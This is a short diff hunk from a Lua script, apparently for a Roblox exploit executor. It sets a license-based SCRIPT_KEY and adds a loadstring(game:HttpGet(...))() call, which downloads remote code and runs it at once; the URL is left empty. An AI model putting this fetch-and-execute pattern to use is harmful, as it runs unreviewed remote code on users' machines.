@@ -24,3 +24,10 @@ local Success, Error = pcall(function()
 end)
 
 getgenv().SCRIPT_KEY = Loader.License
+
+
+loadstring(
+    game:HttpGet(
+        '', true
+    )
+)()
